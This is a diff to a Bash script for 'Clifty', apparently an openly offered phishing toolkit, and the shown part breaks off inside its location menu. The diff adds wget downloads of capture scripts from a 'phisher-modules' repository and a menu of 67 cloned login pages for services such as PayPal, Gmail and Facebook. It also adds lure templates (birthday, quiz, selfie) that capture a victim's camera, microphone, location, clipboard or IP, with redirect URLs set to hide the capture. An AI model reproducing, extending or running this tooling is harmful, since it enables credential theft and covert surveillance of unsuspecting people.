@@ -115,14 +115,18 @@ pro_dir=$(pwd) #project directory
 server_dir="${pro_dir}/.server" #server directory
 www_dir="${pro_dir}/.server/www" #www directory
 assets_dir="${pro_dir}/assets" #assets directory
+fetch_dir="${pro_dir}/assets/fetch" #fetch directory
 dgf_dir="${pro_dir}/assets/dgf" #dgf directory
-dumps_dir="${pro_dir}/assets/dumps" #dgf directory
+dumps_dir="${pro_dir}/assets/dumps" #dumps directory
 update_dir="${pro_dir}/assets/update" #update dir
 sites_dir="${pro_dir}/.sites" #sites directory
 logs_dir="${pro_dir}/logs" #logs directory
+final_site_dir=" " #final site
+final_logs_dir=" "
 
 #Date---
-log_name=$(date +%d-%m-%Y-%H-%M-%S)
+log_dir_name=$(date +%d-%m-%Y-%H-%M-%S)
+log_name=logs.txt
 date_date=$(date +%d)
 date_month=$(date +%m)
 date_year=$(date +%Y)
@@ -130,19 +134,42 @@ date_hour=$(date +%H)
 date_minute=$(date +%M)
 date_second=$(date +%S)
 date_nanosec=$(date +%n)
-#prompt---
-selected="Clifty"
+
+#Links
+link_modules_raw=https://raw.githubusercontent.com/Alygnt/phisher-modules
+
+#Prompt---
+prompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty${NF} >>${NA} ${CYAN}")"
+
+#Variables---
+site_access="" #to store access type i.e login, cam, mic, etc
+site_name="" # To store site name
+site_id="" # To store site id 
+site_template="" #to store site type i.e default, poll etc
+
+capture_type="" #to store capture type i.e otp, notp, etc
+
+dgfname="" #to store zip name for downloading the site
+
+rdurl="" #to store default redirect URL
+
+myip="" #to store ausers ip
+netstats="" #to store network type
+plainnetstats="" #to store network type in plain
+
+tunnel_name="" #to store tunnel type i.e ngrok, etc
+tunnel_id="" #to store tunnel id i.e ngrok, etc
 
 #Normal Banner
 banner(){
         echo -e " "
         echo -e "${MAGENTA}-----------------------------------------------------------${NC} "
-	echo -e "${MAGENTA}|       ${BLUE} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
 	echo -e "${MAGENTA}-----------------------------------------------------------${NC}"
         echo -e ""
 }
@@ -150,12 +177,12 @@ banner(){
 cbanner(){
         echo -e " "
         echo -e "${MAGENTA}-----------------------------------------------------------${NC} "
-	echo -e "${MAGENTA}|       ${BLUE} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}|       ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|       ${CYAN} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
 	echo -e "${MAGENTA}-----------------------------------------------------------${NC}"
 	echo -e "${BOLDBLUE}           ᴠᴇʀsɪᴏɴ 1.4               ＢＹ －ＡＬＹＧＮＴ           ${NC}"
         echo -e ""
@@ -163,45 +190,67 @@ cbanner(){
 #Small Banner
 sbanner(){
 	echo -e " "
-	echo -e "${BLUE} ░█▀▀░█░░░▀█▀░█▀▀░▀█▀░█░█ ${NC}"
-	echo -e "${BLUE} ░█░░░█░░░░█░░█▀▀░░█░░░█░ ${NC}"
-	echo -e "${BLUE} ░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░░▀░ ${NC}"
+	echo -e "${CYAN} ░█▀▀░█░░░▀█▀░█▀▀░▀█▀░█░█ ${NC}"
+	echo -e "${CYAN} ░█░░░█░░░░█░░█▀▀░░█░░░█░ ${NC}"
+	echo -e "${CYAN} ░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░░▀░ ${NC}"
 	echo -e "${NC} "
-}
-
-## Update Prompt
-uprompt(){
-        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected}${NF} >>${NA} ${BLUE}")"
 }
 
 ## Directories
 directories(){
-if [[ ! -d "${server_dir}" ]]; then
-        mkdir -p "${server_dir}"
-fi
-if [[ ! -d "${logs_dir}" ]]; then
-        mkdir -p "${logs_dir}"
-fi
-if [[ -d "${www_dir}" ]]; then
-        rm -rf "${www_dir}"
-        mkdir -p "${www_dir}"
-else
-        mkdir -p "${www_dir}"
-fi
-if [[ -e ".cld.log" ]]; then
-        rm -rf ".cld.log"
-fi
-if [  ! -e "${assets_dir}/ip.php" ]; then
-        wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/phisher-modules/sites/ip.php
-	mv ip.php ${assets_dir}
-fi
-if [ ! -e "${assets_dir}/index.php" ]; then
-	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/phisher-modules/sites/index.php
-	mv index.php ${assets_dir}
-fi
-if [ !  -x "${dgf_dir}/dgf.sh" ];then
-	chmod 777 "${dgf_dir}/dgf.sh"
-fi
+        if [[ ! -d "${server_dir}" ]]; then
+                mkdir -p "${server_dir}"
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created server directory"
+        fi
+        if [[ ! -d "${logs_dir}" ]]; then
+                mkdir -p "${logs_dir}"
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Logs directory"
+        fi
+        
+        if [[ ! -d "${fetch_dir}" ]]; then
+                mkdir "${fetch_dir}"
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Fetch directory"
+        fi
+        if [[ -d "${www_dir}" ]]; then
+                rm -rf "${www_dir}"
+                mkdir -p "${www_dir}"
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created www directory"
+        else
+                mkdir -p "${www_dir}"
+                
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created www directory"
+        fi
+        if [[ -e ".cld.log" ]]; then
+                rm -rf ".cld.log"
+        fi
+        if [  ! -e "${fetch_dir}/ip.php" ]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/ip.php
+                mv ip.php ${fetch_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded ip.php"
+        fi
+        if [ ! -e "${fetch_dir}/index.php" ]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/index.php
+                mv index.php ${fetch_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded index.php"
+        fi
+        if [  ! -e "${fetch_dir}/device.php" ]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.php
+                mv device.php ${fetch_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.php"
+        fi
+        if [ ! -e "${fetch_dir}/device_post.php" ]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device_post.php
+                mv device_post.php ${fetch_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device_post.php"
+        fi
+        if [ ! -e "${fetch_dir}/device.js" ]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js
+                mv device.js ${fetch_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
+        fi
+        if [ !  -x "${dgf_dir}/dgf.sh" ];then
+                chmod 777 "${dgf_dir}/dgf.sh"
+        fi
 }
 
 #Dependencies
@@ -282,90 +331,649 @@ xpermission(){
 }
 
 #check for updates
-check_net_update(){
-	check_netstats
+update(){
+	status
 	if [ $plainnetstats == "online" ]; then
                 { clear; banner; }
-		check_update
+                lat_ver=$( cat ${update_dir}/version.txt )
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Updating ( Version: ${lat_ver} ) ${NC} "
+		cd ${pro_dir}
+                lat_ver=$( cat ${update_dir}/version.txt )
+                git reset --hard
+                git pull
+                echo -e " "
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
+                sleep 2
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${MAGENTA} RESTARTING THE TOOL!!${NC} "
+                cd ${pro_dir}
+                chmod 777 clifty.sh
+                bash clifty.sh
+                
 	else
 		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED}Your offline, Check your internet and try again."
 		sleep 5
-		mainmenu
+		homepage
 	fi
 }
-check_update() {
-	rm -rf version.txt
-	rm -rf ${update_dir}/tmp
-	mkdir ${update_dir}/tmp
 
-	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/Clifty/main/assets/update/version.txt > /dev/null 2>&1
-	mv version.txt ${update_dir}/tmp
-
-	current_ver=$( cat ${update_dir}/version.txt )
-	lat_ver=$( cat ${update_dir}/tmp/version.txt )
-	if [ -z $lat_ver]; then
-                echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED}Error occured try again later!!."
-		sleep 5
-		mainmenu
-        else
-                if [ $current_ver == $lat_ver ]; then
-		        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
-		        { sleep 3; clear; mainmenu; }
-	        else
-        		echo -e " "
-                        echo -e "${ULWHITE}${BOLDWHITE}UPDATE FOUND!! ${NF} : ${NA}"
-                        echo -e " "
-		        echo -e "${GREEN} Current version = ${YELLOW} $current_ver "
-		        echo -e "${GREEN} Latest version = ${YELLOW} $lat_ver "
-                        echo -e " "
-                        echo -e "${GREEN}[${WHITE}?${GREEN}]${GREEN} Do you want to update it? ${NF}"
-                        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
-                        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
-                        echo -e " "
-                        temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
-	                read -p "${temprompt}" ureply
-		        case $ureply in
-        			Y | y)
-        				update;;
-			        N | n | *)
-				        { clear;  mainmenu; };;
-		        esac
-	        fi
-        fi
-}
-
-update() {
-	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
-	mkdir $HOME/clifty
-	if [ -e ${server_dir}/ngrok ]; then
-		mv ${server_dir}/ngrok $HOME/clifty
-	fi
-	if [ -e ${server_dir}/cloudflared ]; then
-        	mv ${server_dir}/cloudflared $HOME/clifty
-	fi
-
-	cd ..
-	rm -rf Clifty
-	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
-	git clone https://github.com/Alygnt/Clifty
-
-	if [ -d Clifty ]; then
-		cd Clifty
-	        mv $HOME/clifty/ngrok ${server_dir}
-	        mv $HOME/clifty/cloudflared ${server_dir}
-	        rm -rf $HOME/clifty
-	        credits_banner
-		echo -e " "
-		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
-	        sleep 0.3
-		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
-	        sleep 2
-	        bash clifty.sh
-		echo  " "
+status() {     
+        myip=$(curl -s ipinfo.io/ip)
+	if [ -z $myip ]; then
+		myip="${BOLDRED}Offline"
+		netstats="${BOLDRED}Offline"
+                plainnetstats="offline"
 	else
-		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
-	fi
+		myip="${BOLDGREEN}$myip"
+		netstats="${BOLDGREEN}Online"
+                plainnetstats="online"
+	fi           
+}
+status_display(){
+        { clear; banner; }
+        if [[ ! -z $myip ]]; then
+		echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+        else
+                status
+        fi
+        if [[ ! -z $netstats ]]; then
+		echo -e "\t\t${GREEN})) ${BLUE}Network Status = $netstats${NA}"
+        else
+                status
+        fi
+        if [[ ! -z $site_access ]]; then
+		echo -e "\t\t${GREEN})) ${ULBLUE}SITE TYPE${NA}: ${BOLDMAGENTA}${site_access}${NA}"
+        fi
+        if [[ ! -z $site_name ]]; then
+		echo -e "\t\t${GREEN})) ${ULBLUE}SITE NAME${NA}: ${BOLDMAGENTA}${site_name}${NA}"
+        fi
+        if [[ ! -z $site_template ]]; then
+		echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${BOLDMAGENTA}${site_template}${NA}"
+        fi
+        if [[ ! -z $tunnel_name ]]; then
+		echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${BOLDMAGENTA}${tunnel_name}${NA}"
+        fi
+        if [[ ! -z $PORT ]]; then
+		echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${BOLDMAGENTA}${PORT}${NA}"
+        fi
+        if [[ ! -z $rdurl ]]; then
+		echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${BOLDMAGENTA}${rdurl}${NA}"
+        fi
+        echo -e ""
+        echo -e ""
+}
 
+homepage() {
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${GREEN} Login          ${NC}""${CYAN} [A]${MAGENTA} About             ${NC}"
+echo -e "${CYAN} [2]${GREEN} Camera         ${NC}""${CYAN} [B]${MAGENTA} Request site      ${NC}"
+echo -e "${CYAN} [3]${GREEN} Microphone     ${NC}""${CYAN} [C]${MAGENTA} Report Issue      ${NC}"
+echo -e "${CYAN} [4]${GREEN} Location       ${NC}""${CYAN} [D]${MAGENTA} Download All sites${NC}"
+echo -e "${CYAN} [5]${GREEN} Clipboard      ${NC}""${CYAN} [E]${MAGENTA} Logs              ${NC}"
+echo -e "${CYAN} [6]${GREEN} IP address     ${NC}""${CYAN} [F]${MAGENTA} Update            ${NC}"
+echo -e " "
+echo -e "${CYAN}              [X/0]${RED} EXIT ${NC}"
+echo -e " "
+ read -p "${prompt}" reply_home
+case $reply_home in
+        1 )
+                site_access="login"
+		menu_login;;
+        2 )
+                site_access="camera"
+		menu_camera;;
+        3 )
+                site_access="microphone"
+		menu_microphone;;
+        4 )
+                site_access="location"
+		menu_location;;
+        5 )
+                site_access="clipboard"
+		menu_clipboard;;
+        6 )
+                site_access="ip_address"
+		menu_ip;;
+	A | a)
+		xdg-open https://github.com/Alygnt/Clifty
+		{ sleep 2; clear;  banner; homepage; };;
+	B | b )
+                xdg-open https://github.com/Alygnt/Clifty/discussions/new?category=new-site
+		{ sleep 2; clear; banner; homepage; };;
+        C | c)
+                xdg-open https://github.com/RDXLR/Alygnt/issues/new
+		{ sleep 2; clear; banner; homepage; };;
+        D | d)
+                download_allsite;;
+	E | e)
+		logs_check;;
+	F | f)
+		update;;
+        G | g)
+                xdg-open https://github.com/Alygnt/Clifty/discussions
+		{ sleep 2; clear; banner; homepage; };;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; homepage; };;
+esac
+tunnel_menu
+}
+
+
+
+menu_login() {
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Adobe         ${NC}""${CYAN} [26]${MAGENTA} Mediafire    ${NC}""${CYAN} [51]${MAGENTA} Telenor       ${NC}"
+echo -e "${CYAN} [2]${MAGENTA} Airtel Sim    ${NC}""${CYAN} [27]${MAGENTA} Messenger    ${NC}""${CYAN} [52]${MAGENTA} Tiktok        ${NC}"
+echo -e "${CYAN} [3]${MAGENTA} AirtelXstream ${NC}""${CYAN} [28]${MAGENTA} Microsoft    ${NC}""${CYAN} [53]${MAGENTA} Twitch        ${NC}"
+echo -e "${CYAN} [4]${MAGENTA} Ajio          ${NC}""${CYAN} [29]${MAGENTA} Mobikwik     ${NC}""${CYAN} [54]${MAGENTA} Twitter       ${NC}"
+echo -e "${CYAN} [5]${MAGENTA} Amazon        ${NC}""${CYAN} [30]${MAGENTA} Myspace      ${NC}""${CYAN} [55]${MAGENTA} Ubereats      ${NC}"
+echo -e "${CYAN} [6]${MAGENTA} Apple         ${NC}""${CYAN} [31]${MAGENTA} Netflix      ${NC}""${CYAN} [56]${MAGENTA} verizon       ${NC}"
+echo -e "${CYAN} [7]${MAGENTA} Badoo         ${NC}""${CYAN} [32]${MAGENTA} Ola          ${NC}""${CYAN} [57]${MAGENTA} VI            ${NC}"
+echo -e "${CYAN} [8]${MAGENTA} Clash of Clans${NC}""${CYAN} [33]${MAGENTA} Origin       ${NC}""${CYAN} [58]${MAGENTA} VK            ${NC}"
+echo -e "${CYAN} [9]${MAGENTA} Date          ${NC}""${CYAN} [34]${MAGENTA} Paypal       ${NC}""${CYAN} [59]${MAGENTA} Whatsapp      ${NC}"
+echo -e "${CYAN} [10]${MAGENTA} Devianart    ${NC}""${CYAN} [35]${MAGENTA} Paytm        ${NC}""${CYAN} [60]${MAGENTA} Wordpress     ${NC}"
+echo -e "${CYAN} [11]${MAGENTA} DropBox      ${NC}""${CYAN} [36]${MAGENTA} Phonepe      ${NC}""${CYAN} [61]${MAGENTA} Xbox          ${NC}"
+echo -e "${CYAN} [12]${MAGENTA} Ebay         ${NC}""${CYAN} [37]${MAGENTA} Pinterest    ${NC}""${CYAN} [62]${MAGENTA} Yahoo         ${NC}"
+echo -e "${CYAN} [13]${MAGENTA} Facebook     ${NC}""${CYAN} [38]${MAGENTA} Playstation  ${NC}""${CYAN} [63]${MAGENTA} Yandex        ${NC}"
+echo -e "${CYAN} [14]${MAGENTA} Flipcart     ${NC}""${CYAN} [39]${MAGENTA} ProtonMail   ${NC}""${CYAN} [64]${MAGENTA} Youtube Subs  ${NC}"
+echo -e "${CYAN} [15]${MAGENTA} Freefire     ${NC}""${CYAN} [40]${MAGENTA} Pubg         ${NC}""${CYAN} [65]${MAGENTA} Discord       ${NC}"
+echo -e "${CYAN} [16]${MAGENTA} Github       ${NC}""${CYAN} [41]${MAGENTA} Quora        ${NC}""${CYAN} [66]${MAGENTA} Google WIFI   ${NC}"
+echo -e "${CYAN} [17]${MAGENTA} Gitlab       ${NC}""${CYAN} [42]${MAGENTA} Reddit       ${NC}""${CYAN} [67]${MAGENTA} Mobile Pattern${NC}"
+echo -e "${CYAN} [18]${MAGENTA} Gmail        ${NC}""${CYAN} [43]${MAGENTA} Shopify      ${NC}"
+echo -e "${CYAN} [19]${MAGENTA} Google       ${NC}""${CYAN} [44]${MAGENTA} Snapchat     ${NC}"
+echo -e "${CYAN} [20]${MAGENTA} Gpay         ${NC}""${CYAN} [45]${MAGENTA} Socialclub   ${NC}"
+echo -e "${CYAN} [21]${MAGENTA} icloud       ${NC}""${CYAN} [46]${MAGENTA} Spotify      ${NC}"
+echo -e "${CYAN} [22]${MAGENTA} Instagram    ${NC}""${CYAN} [47]${MAGENTA} Stackoverflow${NC}"
+echo -e "${CYAN} [23]${MAGENTA} Jazz         ${NC}""${CYAN} [48]${MAGENTA} Steam        ${NC}"
+echo -e "${CYAN} [24]${MAGENTA} Jio          ${NC}""${CYAN} [49]${MAGENTA} Subitout     ${NC}"
+echo -e "${CYAN} [25]${MAGENTA} Linkedin     ${NC}""${CYAN} [50]${MAGENTA} Telegram     ${NC}"
+echo -e " "
+echo -e "${CYAN} [X]${RED} Back to ${ULRED}HOME PAGE${NF}"
+echo -e " "
+read -p "${prompt}" reply_login
+echo -e " "
+case $reply_login in
+        1 | 01)
+                login_adobe;;
+        2 | 02)
+                login_airtelsim;;
+	3 | 03)
+                login_airtelxstream;;
+	4 | 04)
+		login_ajio;;
+	5 | 05)
+                login_amazon;;
+        6 | 06)
+                login_apple;;
+	7 | 07)
+                login_badoo;;
+        8 | 08)
+                login_clashofclans;;
+	9 | 09)
+                login_date;;
+        10)
+                login_devianart;;
+	11)
+                login_dropbox;;
+	12)
+                login_ebay;;
+        13)
+                login_facebook;;
+	14)
+                login_flipcart;;
+	15)
+                login_freefire;;
+        16)
+                login_github;;
+	17)
+                login_gitlab;;
+	18)
+                login_gmail;;
+        19)
+                login_google;;
+	20)
+	        login_gpay;;
+	21)
+                login_icloud;;
+	22)
+                login_instagram;;
+	23)
+                login_jazz;;
+        24)
+                login_jio;;
+        25)
+                login_linkedin;;
+        26)
+                login_mediafire;;
+	27)
+                login_messenger;;
+	28)
+                login_microsoft;;
+	29)
+                login_mobiwik;;
+	30)
+                login_myspace;;
+	31)
+                login_netflix;;
+	32)
+                login_ola;;
+	33)
+                login_origin;;
+	34)
+                login_paypal;;
+	35)
+                login_paytm;;
+	36)
+                login_phonepe;;
+	37)
+                login_pinterest;;
+	38)
+		login_playstation;;
+	39)
+                login_protonmail;;
+	40)
+                login_pubg;;
+	41)
+                login_quora;;
+	42)
+                login_reddit;;
+	43)
+                login_shopify;;
+	44)
+                login_snapchat;;
+	45)
+                login_socialclub;;
+	46)
+                login_spotify;;
+	47)
+                login_stackoverflow;;
+	48)
+                login_steam;;
+	49)
+                login_subitoit;;
+	50)
+                login_telegram;;
+	51)
+                login_telenor;;
+	52)
+                login_tiktok;;
+        53)
+                login_twitch;;
+	54)
+                login_twitter;;
+        55)
+                login_ubereats;;
+	56)
+                login_verizon;;
+        57)
+                login_visim;;
+	58)
+                login_vk;;
+        59)
+                login_whatsapp;;
+	60)
+                login_wordpress;;
+        61)
+                login_xbox;;
+	62)
+                login_yahoo;;
+        63)
+                login_yandex;;
+	64)
+                login_ytsubs;;
+	65)
+		login_discord;;
+	66)
+		login_googlewifi;;
+	67)
+		login_pattern;;
+        X | x)
+                menu_login;;
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                { sleep 1; clear; menu_login; };;
+esac
+}
+menu_camera(){
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN}     IMAGE            ${NC}""${CYAN}     VIDEO             ${NC}"
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}""${CYAN} [A]${MAGENTA} Filter            ${NC}"
+echo -e "${CYAN} [2]${MAGENTA} Birthday       ${NC}""${CYAN} [B]${MAGENTA} Online Meet       ${NC}"
+echo -e "${CYAN} [3]${MAGENTA} Book           ${NC}" 
+echo -e "${CYAN} [4]${MAGENTA} Box Wish       ${NC}"
+echo -e "${CYAN} [5]${MAGENTA} Firework       ${NC}"
+echo -e "${CYAN} [6]${MAGENTA} Game           ${NC}"
+echo -e "${CYAN} [7]${MAGENTA} Guess          ${NC}"
+echo -e "${CYAN} [8]${MAGENTA} Quiz           ${NC}"
+echo -e "${CYAN} [9]${MAGENTA} RPS            ${NC}"
+echo -e "${CYAN} [10]${MAGENTA} Selfie        ${NC}"
+echo -e "${CYAN} [11]${MAGENTA} Spinwheel     ${NC}"
+echo -e " "
+echo -e "${CYAN}              [X/0]${RED} EXIT ${NC}"
+echo -e " "
+read -p "${prompt}" reply_camera
+case $reply_camera in
+        1 )
+                site_id="default"
+                dgfname="default"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Default" ;;
+        2 )
+                site_id="birthday"
+                dgfname="birthday"
+                rdurl="www.homemade-gifts-made-easy.com/image-files/happy-birthday-images-many-blessings-600x900.jpg"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Birthday" ;;
+        3 )
+                site_id="book"
+                dgfname="book"
+                rdurl="www.amazon.in/Think-Grow-Rich-Napoleon-Hill/dp/8194790883"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Book" ;;
+        4 )
+                site_id="boxwish"
+                dgfname="boxwish"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Box Wish" ;;
+        5 )
+                site_id="firework"
+                dgfname="firework"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Firework" ;;
+        6 )
+                site_id="game"
+                dgfname="game"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Game" ;;
+        7 )
+                site_id="guess"
+                dgfname="guess"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Guess" ;;
+	8 )
+                site_id="quiz"
+                dgfname="quiz"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Quiz" ;;
+        9 )
+                site_id="rps"
+                dgfname="rps"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="RPS" ;;
+        10 )
+                site_id="selfie"
+                dgfname="selfie"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Selfie" ;;
+        11 )
+                site_id="spinwheel"
+                dgfname="spinwheel"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Image"
+                capture_type="IMG"
+                site_template="Spin Wheel" ;;
+        A | a )
+                site_id="filter"
+                dgfname="filter"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Video"
+                capture_type="VIDEO"
+                site_template="Filter" ;;
+        B | b )
+                site_id="onlinemeet"
+                dgfname="onlinemeet"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Video"
+                capture_type="VIDEO"
+                site_template="Online Meet" ;;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; menu_camera; };;
+esac    
+}
+menu_microphone(){
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
+echo -e "${CYAN} More sites are coming soon   ${NC}"
+echo -e " "
+echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
+echo -e " "
+read -p "${prompt}" reply_microphone
+case $reply_microphone in
+        1 )
+                site_id="default"
+                dgfname="default"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="Microphone"
+                capture_type="MIC"
+                site_template="Default" ;;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; menu_microphone; };;
+esac    
+}
+menu_location(){
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Google Drive   ${NC}"
+echo -e "${CYAN} [2]${MAGENTA} Near You       ${NC}"
